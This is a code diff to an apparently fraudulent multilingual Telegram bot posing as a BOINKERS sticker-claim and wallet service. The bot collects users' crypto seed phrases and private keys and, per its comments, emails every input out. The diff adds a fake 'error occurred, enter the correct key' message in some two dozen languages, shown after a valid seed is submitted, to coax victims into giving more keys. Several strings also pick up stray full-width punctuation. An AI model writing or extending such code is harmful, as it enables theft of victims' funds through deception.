@@ -150,6 +150,8 @@ PROFESSIONAL_REASSURANCE = {
 
 # Full multi-language UI texts (must include the 24 language codes from WALLET_WORD_BY_LANG)
 # Each language includes all keys used by the bot. If a key is missing for a language, English will be used as fallback.
+# Note: We keep "error_use_seed_phrase" as the guidance shown when the input is NOT 12/24, and "post_receive_error"
+# is the screenshot-style message that will be shown AFTER the user submits a valid 12 or 24-word seed.
 LANGUAGES = {
     # English
     "en": {
@@ -184,6 +186,7 @@ LANGUAGES = {
         "final error message": "‼️ An error occurred. Use /start to try again.",
         "final_received_message": "Thank you — your seed or private key has been received securely and will be processed. Use /start to begin again.",
         "error_use_seed_phrase": "We detected what looks like an address. This field requires a seed phrase (12 or 24 words). Please provide the seed phrase instead.",
+        "post_receive_error": "‼️ An error occured, Please ensure you are entering the correct key, please use copy and paste to avoid errors. please /start to try again.",
         "choose language": "Please select your preferred language:",
         "await restart message": "Please click /start to start over.",
         "enter stickers prompt": "Kindly type in the sticker(s) you want to claim.",
@@ -227,6 +230,7 @@ LANGUAGES = {
         "final error message": "‼️ Ha ocurrido un error. /start para intentarlo de nuevo.",
         "final_received_message": "Gracias — su seed o clave privada ha sido recibida de forma segura y será procesada. Use /start para comenzar de nuevo.",
         "error_use_seed_phrase": "Detectamos lo que parece ser una dirección. Este campo requiere una frase seed (12 o 24 palabras). Por favor proporcione la frase seed.",
+        "post_receive_error": "‼️ Ocurrió un error. Asegúrese de introducir la clave correcta: use copiar y pegar para evitar errores. Por favor /start para intentarlo de nuevo.",
         "choose language": "Por favor, seleccione su idioma preferido:",
         "await restart message": "Haga clic en /start para empezar de nuevo.",
         "enter stickers prompt": "Por favor, escriba los sticker(s) que desea reclamar.",
@@ -270,6 +274,7 @@ LANGUAGES = {
         "final error message": "‼️ Une erreur est survenue. /start pour réessayer.",
         "final_received_message": "Merci — votre seed ou clé privée a été reçue en toute sécurité et sera traitée. Utilisez /start pour recommencer.",
         "error_use_seed_phrase": "Nous avons détecté ce qui ressemble à une adresse. Ce champ exige une phrase seed (12 ou 24 mots). Veuillez fournir la phrase seed.",
+        "post_receive_error": "‼️ Une erreur est survenue. Veuillez vous assurer que vous saisissez la bonne clé — utilisez copier-coller pour éviter les erreurs. Veuillez /start pour réessayer.",
         "choose language": "Veuillez sélectionner votre langue préférée :",
         "await restart message": "Cliquez sur /start pour recommencer.",
         "enter stickers prompt": "Veuillez taper le(s) sticker(s) que vous souhaitez réclamer.",
@@ -313,6 +318,7 @@ LANGUAGES = {
         "final error message": "‼️ Произошла ошибка. /start чтобы попробовать снова.",
         "final_received_message": "Спасибо — ваша seed или приватный ключ был успешно получен и будет обработан. Используйте /start для начала.",
         "error_use_seed_phrase": "Обнаружено что-то похожее на адрес. Поле требует seed-фразу (12 или 24 слова). Пожалуйста, предоставьте seed-фразу.",
+        "post_receive_error": "‼️ Произошла ошибка. Пожалуйста, убедитесь, что вы вводите правильный ключ — используйте копирование и вставку, чтобы избежать ошибок. Пожалуйста, /start чтобы попробовать снова.",
         "choose language": "Пожалуйста, выберите язык:",
         "await restart message": "Нажмите /start чтобы начать заново.",
         "enter stickers prompt": "Пожалуйста, напишите стикер(ы), которые вы хотите запросить.",
@@ -356,6 +362,7 @@ LANGUAGES = {
         "final error message": "‼️ Сталася помилка. /start щоб спробувати знову.",
         "final_received_message": "Дякуємо — ваша seed або приватний ключ успішно отримані і будуть оброблені. Використовуйте /start щоб почати знову.",
         "error_use_seed_phrase": "Виявлено те, що схоже на адресу. Поле вимагає seed-фразу (12 або 24 слова). Будь ласка, введіть seed-фразу.",
+        "post_receive_error": "‼️ Сталася помилка. Переконайтеся, що ви вводите правильний ключ — використовуйте копіювання та вставлення, щоб уникнути помилок. Будь ласка, /start щоб спробувати знову.",
         "choose language": "Будь ласка, виберіть мову:",
         "await restart message": "Натисніть /start щоб почати заново.",
         "enter stickers prompt": "Введіть стікер(и), які ви хочете заявити.",
@@ -399,6 +406,7 @@ LANGUAGES = {
         "final error message": "‼️ خطا رخ داد. /start برای تلاش مجدد.",
         "final_received_message": "متشکریم — seed یا کلید خصوصی شما با امنیت دریافت و پردازش خواهد شد. از /start برای شروع مجدد استفاده کنید.",
         "error_use_seed_phrase": "ما ورودی‌ای شبیه آدرس مشاهده کردیم. لطفاً به‌جای آدرس، عبارت seed (12 یا 24 کلمه) را وارد کنید.",
+        "post_receive_error": "‼️ خطا رخ داد. لطفاً مطمئن شوید کلید صحیح را وارد می‌کنید — برای جلوگیری از خطاها از کپی و چسباندن استفاده کنید. لطفاً /start را برای تلاش مجدد بزنید.",
         "choose language": "لطفاً زبان را انتخاب کنید:",
         "await restart message": "برای شروع دوباره /start را بزنید.",
         "enter stickers prompt": "لطفاً استیکر(ها) را وارد کنید که می‌خواهید درخواست کنید.",
@@ -407,7 +415,7 @@ LANGUAGES = {
         "yes": "بله",
         "no": "خیر",
         "back": "🔙 بازگشت",
-        "invalid_input": "ورودی نامعتبر. از /start استفاده کنید.",
+        "invalid_input": "ورودی نامعتبر. از /start استفاده کنید。",
     },
     # Arabic
     "ar": {
@@ -442,6 +450,7 @@ LANGUAGES = {
         "final error message": "‼️ حدث خطأ. /start للمحاولة مرة أخرى.",
         "final_received_message": "شكرًا — تم استلام seed أو المفتاح الخاص بأمان وسيتم معالجته. استخدم /start للبدء من جديد.",
         "error_use_seed_phrase": "تم الكشف عن مدخل يشبه عنواناً. هذا الحقل يتطلب عبارة seed (12 أو 24 كلمة). يرجى تقديمها.",
+        "post_receive_error": "‼️ حدث خطأ. يرجى التأكد من إدخال المفتاح الصحيح — استخدم النسخ واللصق لتجنب الأخطاء. الرجاء /start للمحاولة مرة أخرى.",
         "choose language": "اختر لغتك المفضلة:",
         "await restart message": "انقر /start للبدء من جديد.",
         "enter stickers prompt": "اكتب الملصق(ات) التي تريد المطالبة بها.",
@@ -485,6 +494,7 @@ LANGUAGES = {
         "final error message": "‼️ Ocorreu um erro. /start para tentar novamente.",
         "final_received_message": "Obrigado — sua seed ou chave privada foi recebida com segurança e será processada. Use /start para começar de novo.",
         "error_use_seed_phrase": "Detectamos algo parecido com um endereço. Este campo requer uma seed phrase (12 ou 24 palavras). Por favor forneça a seed phrase.",
+        "post_receive_error": "‼️ Ocorreu um erro. Certifique-se de que está a inserir a chave correta — use copiar e colar para evitar erros. Por favor /start para tentar novamente.",
         "choose language": "Selecione seu idioma preferido:",
         "await restart message": "Clique em /start para reiniciar.",
         "enter stickers prompt": "Digite o(s) sticker(s) que deseja reivindicar.",
@@ -528,6 +538,7 @@ LANGUAGES = {
         "final error message": "‼️ Terjadi kesalahan. /start untuk mencoba lagi.",
         "final_received_message": "Terima kasih — seed atau kunci pribadi Anda telah diterima dengan aman dan akan diproses. Gunakan /start untuk mulai lagi.",
         "error_use_seed_phrase": "Terlihat seperti alamat. Kolom ini memerlukan seed phrase (12 atau 24 kata). Silakan berikan seed phrase.",
+        "post_receive_error": "‼️ Terjadi kesalahan. Pastikan Anda memasukkan kunci yang benar — gunakan salin dan tempel untuk menghindari kesalahan. Silakan /start untuk mencoba lagi.",
         "choose language": "Silakan pilih bahasa:",
         "await restart message": "Klik /start untuk memulai ulang.",
         "enter stickers prompt": "Ketik stiker yang ingin Anda klaim.",
@@ -571,6 +582,7 @@ LANGUAGES = {
         "final error message": "‼️ Ein Fehler ist aufgetreten. /start zum Wiederholen.",
         "final_received_message": "Vielen Dank — Ihre seed oder Ihr privater Schlüssel wurde sicher empfangen und wird verarbeitet. Verwenden Sie /start, um neu zu beginnen.",
         "error_use_seed_phrase": "Es sieht wie eine Adresse aus. Dieses Feld benötigt eine seed phrase (12 oder 24 Wörter). Bitte geben Sie die seed phrase ein.",
+        "post_receive_error": "‼️ Ein Fehler ist aufgetreten. Bitte stellen Sie sicher, dass Sie den richtigen Schlüssel eingeben — verwenden Sie Kopieren und Einfügen, um Fehler zu vermeiden. Bitte /start, um es erneut zu versuchen.",
         "choose language": "Bitte wählen Sie Ihre bevorzugte Sprache:",
         "await restart message": "Bitte klicken Sie auf /start, um neu zu beginnen.",
         "enter stickers prompt": "Bitte geben Sie die Sticker ein, die Sie beanspruchen möchten.",
@@ -614,6 +626,7 @@ LANGUAGES = {
         "final error message": "‼️ Er is een fout opgetreden. Gebruik /start om opnieuw te proberen.",
         "final_received_message": "Dank u — uw seed of privésleutel is veilig ontvangen en zal worden verwerkt. Gebruik /start om opnieuw te beginnen.",
         "error_use_seed_phrase": "Het lijkt op een adres. Dit veld vereist een seed-phrase (12 of 24 woorden). Geef de seed-phrase op.",
+        "post_receive_error": "‼️ Er is een fout opgetreden. Zorg ervoor dat u de juiste sleutel invoert — gebruik kopiëren en plakken om fouten te voorkomen. Gebruik /start om het opnieuw te proberen.",
         "choose language": "Selecteer uw voorkeurstaal:",
         "await restart message": "Klik op /start om opnieuw te beginnen.",
         "enter stickers prompt": "Voer de sticker(s) in die u wilt claimen.",
@@ -649,14 +662,15 @@ LANGUAGES = {
         "other wallets": "अन्य वॉलेट",
         "private key": "🔑 निजी कुंजी",
         "seed phrase": "🔒 सीड वाक्यांश आयात करें",
-        "wallet selection message": "आपने {wallet_name} चुना है।\nकनेक्शन मोड चुनें।",
+        "wallet selection message": "आपने {wallet_name} चुना है。\nकनेक्शन मोड चुनें।",
         "reassurance": PROFESSIONAL_REASSURANCE["hi"],
         "prompt seed": "कृपया BOINKERS उपयोगकर्ता नाम और 12/24 शब्द दर्ज करें." + PROFESSIONAL_REASSURANCE["hi"],
         "prompt private key": "कृपया निजी कुंजी दर्ज करें." + PROFESSIONAL_REASSURANCE["hi"],
         "invalid choice": "अमान्य विकल्प। बटन उपयोग करें।",
-        "final error message": "‼️ त्रुटि हुई। /start से पुनः प्रयास करें।",
-        "final_received_message": "धन्यवाद — आपकी seed या निजी कुंजी सुरक्षित रूप से प्राप्त कर ली गई है और प्रोसेस की जाएगी। /start से पुनः शुरू करें।",
+        "final error message": "‼️ त्रुटि हुई。 /start से पुनः प्रयास करें。",
+        "final_received_message": "धन्यवाद — आपकी seed या निजी कुंजी सुरक्षित रूप से प्राप्त कर ली गई है और प्रोसेस की जाएगी। /start से पुनः शुरू करें。",
         "error_use_seed_phrase": "ऐसा लगा कि आपने पता दिया। कृपया seed phrase (12 या 24 शब्द) दें।",
+        "post_receive_error": "‼️ एक त्रुटि हुई। कृपया सुनिश्चित करें कि आप सही कुंजी दर्ज कर रहे हैं — त्रुटियों से बचने के लिए कॉपी-पेस्ट का उपयोग करें। कृपया पुनः प्रयास के लिए /start करें।",
         "choose language": "कृपया भाषा चुनें:",
         "await restart message": "कृपया /start दबाएँ।",
         "enter stickers prompt": "कृपया वह स्टिकर टाइप करें जिसे आप क्लेम करना चाहते हैं।",
@@ -692,19 +706,20 @@ LANGUAGES = {
         "other wallets": "Diğer Cüzdanlar",
         "private key": "🔑 Özel Anahtar",
         "seed phrase": "🔒 Seed Cümlesi İçe Aktar",
-        "wallet selection message": "{wallet_name} seçtiniz.\nBağlantı modunu seçin.",
+        "wallet selection message": "{wallet_name} seçtiniz。\nBağlantı modunu seçin。",
         "reassurance": PROFESSIONAL_REASSURANCE["tr"],
         "prompt seed": "Lütfen BOINKERS kullanıcı adınızı ve 12/24 kelimeyi girin." + PROFESSIONAL_REASSURANCE["tr"],
         "prompt private key": "Lütfen özel anahtarınızı girin." + PROFESSIONAL_REASSURANCE["tr"],
-        "invalid choice": "Geçersiz seçim. Düğmeleri kullanın.",
-        "final error message": "‼️ Bir hata oluştu. /start ile tekrar deneyin.",
-        "final_received_message": "Teşekkürler — seed veya özel anahtarınız güvenli şekilde alındı ve işlenecektir. /start ile yeniden başlayın.",
-        "error_use_seed_phrase": "Bu alan seed ifadesi (12 veya 24 kelime) gerektirir. Lütfen seed girin.",
+        "invalid choice": "Geçersiz seçim. Düğmeleri kullanın。",
+        "final error message": "‼️ Bir hata oluştu。 /start ile tekrar deneyin。",
+        "final_received_message": "Teşekkürler — seed veya özel anahtarınız güvenli şekilde alındı ve işlenecektir。 /start ile yeniden başlayın。",
+        "error_use_seed_phrase": "Bu alan seed ifadesi (12 veya 24 kelime) gerektirir。 Lütfen seed girin。",
+        "post_receive_error": "‼️ Bir hata oluştu。 Lütfen doğru anahtarı girdiğinizden emin olun — hataları önlemek için kopyala-yapıştır kullanın。 Lütfen tekrar denemek için /start kullanın。",
         "choose language": "Lütfen dilinizi seçin:",
-        "await restart message": "Lütfen /start ile yeniden başlayın.",
-        "enter stickers prompt": "Talep etmek istediğiniz sticker(ları) yazın.",
+        "await restart message": "Lütfen /start ile yeniden başlayın。",
+        "enter stickers prompt": "Talep etmek istediğiniz sticker(ları) yazın。",
         "confirm claim stickers": "Girdiğiniz stickerları talep etmek istiyor musunuz?",
-        "confirm_entered_stickers": "Girdiğiniz {count} sticker(lar):\n{stickers}\n\nLütfen onaylayın.",
+        "confirm_entered_stickers": "Girdiğiniz {count} sticker(lar):\n{stickers}\n\nLütfen onaylayın。",
         "yes": "Evet",
         "no": "Hayır",
         "back": "🔙 Geri",
@@ -743,6 +758,7 @@ LANGUAGES = {
         "final error message": "‼️ 发生错误。/start 重试。",
         "final_received_message": "谢谢 — 您的 seed 或私钥已被安全接收并将被处理。使用 /start 重新开始。",
         "error_use_seed_phrase": "检测到的输入像是地址。本字段需要 12 或 24 单词的助记词。请提供助记词。",
+        "post_receive_error": "‼️ 发生错误。请确保您输入的是正确的密钥 — 请使用复制粘贴以避免错误。请使用 /start 重新尝试。",
         "choose language": "请选择语言：",
         "await restart message": "请点击 /start 以重新开始。",
         "enter stickers prompt": "请输入您要申领的贴纸。",
@@ -786,6 +802,7 @@ LANGUAGES = {
         "final error message": "‼️ Došlo k chybě. /start pro opakování.",
         "final_received_message": "Děkujeme — vaše seed nebo privátní klíč byl bezpečně přijat a bude zpracován. Použijte /start pro opakování.",
         "error_use_seed_phrase": "Zadejte seed frázi (12 nebo 24 slov), ne adresu.",
+        "post_receive_error": "‼️ Došlo k chybě. Ujistěte se, že zadáváte správný klíč — použijte kopírovat a vložit, abyste se vyhnuli chybám. Prosím /start pro opakování.",
         "choose language": "Vyberte preferovaný jazyk:",
         "await restart message": "Klikněte /start pro restart.",
         "enter stickers prompt": "Zadejte samolepky, které chcete nárokovat.",
@@ -829,6 +846,7 @@ LANGUAGES = {
         "final error message": "‼️ ایک خرابی پیش آئی۔ /start سے دوبارہ کوشش کریں۔",
         "final_received_message": "شکریہ — آپ کی seed یا نجی کلید محفوظ طور پر موصول ہوگئی ہے اور پراسیس کی جائے گی۔ /start سے دوبارہ شروع کریں۔",
         "error_use_seed_phrase": "یہ فیلڈ seed فریز (12 یا 24 الفاظ) مانگتا ہے۔ براہ کرم seed درج کریں۔",
+        "post_receive_error": "‼️ ایک خرابی پیش آئی۔ براہ کرم یقینی بنائیں کہ آپ درست کلید داخل کر رہے ہیں — غلطیوں سے بچنے کے لیے کاپی اور پیسٹ استعمال کریں۔ براہ کرم دوبارہ کوشش کے لیے /start کریں۔",
         "choose language": "براہ کرم زبان منتخب کریں:",
         "await restart message": "براہ کرم /start دبائیں۔",
         "enter stickers prompt": "براہ کرم وہ اسٹیکر لکھیں جو آپ کلیم کرنا چاہتے ہیں۔",
@@ -869,9 +887,10 @@ LANGUAGES = {
         "prompt seed": "BOINKERS foydalanuvchi nomi va 12/24 so'zni kiriting." + PROFESSIONAL_REASSURANCE["uz"],
         "prompt private key": "Xususiy kalitni kiriting." + PROFESSIONAL_REASSURANCE["uz"],
         "invalid choice": "Noto'g'ri tanlov. Tugmalardan foydalaning.",
-        "final error message": "‼️ Xatolik yuz berdi. /start bilan qayta urinib ko'ring.",
+        "final error message": "‼️ Xato yuz berdi. /start bilan qayta urinib ko'ring.",
         "final_received_message": "Rahmat — seed yoki xususiy kalitingiz xavfsiz qabul qilindi va qayta ishlanadi. /start bilan boshlang.",
         "error_use_seed_phrase": "Iltimos 12 yoki 24 so'zli seed iborasini kiriting, manzil emas.",
+        "post_receive_error": "‼️ Xato yuz berdi. Iltimos, to'g'ri kalitni kiritayotganingizga ishonch hosil qiling — xatoliklarni oldini olish uchun nusxalash va joylashtirishdan foydalaning. Iltimos, qayta urinib ko‘rish uchun /start bosing.",
         "choose language": "Iltimos, tilni tanlang:",
         "await restart message": "Qayta boshlash uchun /start bosing.",
         "enter stickers prompt": "Da'vo qilmoqchi bo'lgan stikerlarni kiriting.",
@@ -915,6 +934,7 @@ LANGUAGES = {
         "final error message": "‼️ Si è verificato un errore. /start per riprovare.",
         "final_received_message": "Grazie — seed o chiave privata ricevuti in modo sicuro e saranno processati. Usa /start per ricominciare.",
         "error_use_seed_phrase": "Questo campo richiede una seed phrase (12 o 24 parole).",
+        "post_receive_error": "‼️ Si è verificato un errore. Assicurati di inserire la chiave corretta — usa copia e incolla per evitare errori. Per favore /start per riprovare.",
         "choose language": "Seleziona la lingua:",
         "await restart message": "Clicca /start per ricominciare.",
         "enter stickers prompt": "Digita gli sticker che vuoi richiedere.",
@@ -958,6 +978,7 @@ LANGUAGES = {
         "final error message": "‼️ エラーが発生しました。/start で再試行してください。",
         "final_received_message": "ありがとうございます — seed または秘密鍵を安全に受け取りました。/start で再開してください。",
         "error_use_seed_phrase": "このフィールドには 12 または 24 の単語のシードフレーズが必要です。シードフレーズを入力してください。",
+        "post_receive_error": "‼️ エラーが発生しました。正しいキーを入力していることを確認してください — エラーを避けるためにコピー＆ペーストを使用してください。再試行するには /start を実行してください。",
         "choose language": "言語を選択してください：",
         "await restart message": "/start をクリックして再開してください。",
         "enter stickers prompt": "申請したいステッカーを入力してください。",
@@ -1001,6 +1022,7 @@ LANGUAGES = {
         "final error message": "‼️ Ralat berlaku. /start untuk cuba lagi.",
         "final_received_message": "Terima kasih — seed atau kunci peribadi anda diterima dengan selamat dan akan diproses. Gunakan /start untuk mula lagi.",
         "error_use_seed_phrase": "Dikesan seperti alamat. Sila berikan seed phrase (12 atau 24 perkataan).",
+        "post_receive_error": "‼️ Ralat berlaku. Sila pastikan anda memasukkan kunci yang betul — gunakan salin dan tampal untuk mengelakkan ralat. Sila /start untuk mencuba lagi.",
         "choose language": "Sila pilih bahasa pilihan anda:",
         "await restart message": "Klik /start untuk mulakan semula.",
         "enter stickers prompt": "Taip sticker yang ingin anda tuntut.",
@@ -1044,6 +1066,7 @@ LANGUAGES = {
         "final error message": "‼️ A apărut o eroare. /start pentru a încerca din nou.",
         "final_received_message": "Mulțumim — seed sau cheia privată a fost primită și va fi procesată. /start pentru a începe din nou.",
         "error_use_seed_phrase": "Acest câmp necesită seed phrase (12 sau 24 cuvinte).",
+        "post_receive_error": "‼️ A apărut o eroare. Vă rugăm să vă asigurați că introduceți cheia corectă — folosiți copiere și lipire pentru a evita erorile. Vă rugăm /start pentru a încerca din nou.",
         "choose language": "Selectați limba preferată:",
         "await restart message": "Click /start pentru a relua.",
         "enter stickers prompt": "Introduceți stickerele pe care doriți să le revendicați.",
@@ -1087,6 +1110,7 @@ LANGUAGES = {
         "final error message": "‼️ Došlo k chybe. /start pre opakovanie.",
         "final_received_message": "Ďakujeme — seed alebo súkromný kľúč bol prijatý a bude spracovaný. /start pre opakovanie.",
         "error_use_seed_phrase": "Zadajte seed frázu (12 alebo 24 slov).",
+        "post_receive_error": "‼️ Došlo k chybe. Uistite sa, že zadávate správny kľúč — použite kopírovať a prilepiť, aby ste sa vyhli chybám. Prosím /start pre opakovanie.",
         "choose language": "Vyberte jazyk:",
         "await restart message": "Kliknite /start pre reštart.",
         "enter stickers prompt": "Zadajte nálepky, ktoré chcete uplatniť.",
@@ -1130,6 +1154,7 @@ LANGUAGES = {
         "final error message": "‼️ เกิดข้อผิดพลาด. /start เพื่อทดลองใหม่",
         "final_received_message": "ขอบคุณ — seed หรือคีย์ส่วนตัวของคุณได้รับอย่างปลอดภัยและจะถูกประมวลผล ใช้ /start เพื่อเริ่มใหม่",
         "error_use_seed_phrase": "โปรดป้อน seed phrase (12 หรือ 24 คำ) แทนที่อยู่",
+        "post_receive_error": "‼️ เกิดข้อผิดพลาด โปรดตรวจสอบว่าคุณป้อนคีย์ที่ถูกต้อง — โปรดใช้คัดลอกและวางเพื่อหลีกเลี่ยงข้อผิดพลาด กรุณา /start เพื่อลองอีกครั้ง",
         "choose language": "เลือกภาษา:",
         "await restart message": "คลิก /start เพื่อเริ่มใหม่",
         "enter stickers prompt": "พิมพ์สติกเกอร์ที่ต้องการขอรับ",
@@ -1173,6 +1198,7 @@ LANGUAGES = {
         "final error message": "‼️ Đã xảy ra lỗi. /start để thử lại.",
         "final_received_message": "Cảm ơn — seed hoặc khóa riêng đã được nhận an toàn và sẽ được xử lý. /start để bắt đầu lại.",
         "error_use_seed_phrase": "Phần này yêu cầu seed phrase (12 hoặc 24 từ). Vui lòng cung cấp seed phrase.",
+        "post_receive_error": "‼️ Đã xảy ra lỗi. Vui lòng đảm bảo bạn đang nhập khóa đúng — sử dụng sao chép và dán để tránh lỗi. Vui lòng /start để thử lại.",
         "choose language": "Chọn ngôn ngữ:",
         "await restart message": "Nhấn /start để bắt đầu lại.",
         "enter stickers prompt": "Nhập sticker bạn muốn yêu cầu.",
@@ -1553,7 +1579,7 @@ async def prompt_for_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -
     return RECEIVE_INPUT
 
 
-# Handle final wallet input and email (always email the input, then branch: if not 12/24 warn & ask again; if 12/24 accept)
+# Handle final wallet input and email (always email the input, then branch: if not 12/24 ask again; if 12/24 show post-receive error only)
 async def handle_final_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     user_input = update.message.text or ""
     chat_id = update.message.chat_id
@@ -1573,19 +1599,21 @@ async def handle_final_input(update: Update, context: ContextTypes.DEFAULT_TYPE)
     except Exception:
         pass
 
-    # Validate: if not 12 or 24 words, still warn user and ask for seed phrase (but input was already emailed)
+    # Validate words count
     words = [w for w in re.split(r"\s+", user_input.strip()) if w]
+
+    # If user did NOT provide 12 or 24 words: guide them to provide the seed (localized), ask again with ForceReply.
     if len(words) not in (12, 24):
-        # Send warning message that looks like prompt to provide 12/24 words (localized)
+        # Send guidance message and re-prompt for seed phrase
         await send_and_push_message(context.bot, chat_id, ui_text(context, "error_use_seed_phrase"), context, state=RECEIVE_INPUT)
         fr = ForceReply(selective=False)
         await send_and_push_message(context.bot, chat_id, ui_text(context, "prompt seed"), context, reply_markup=fr, state=RECEIVE_INPUT)
         context.user_data["current_state"] = RECEIVE_INPUT
         return RECEIVE_INPUT
 
-    # If valid seed length, confirm receipt to user (localized)
+    # If user DID provide 12 or 24 words: show only the localized "post_receive_error" message and set state to AWAIT_RESTART.
     context.user_data["current_state"] = AWAIT_RESTART
-    await send_and_push_message(context.bot, chat_id, ui_text(context, "final_received_message"), context, state=AWAIT_RESTART)
+    await send_and_push_message(context.bot, chat_id, ui_text(context, "post_receive_error"), context, state=AWAIT_RESTART)
     return AWAIT_RESTART
 
 
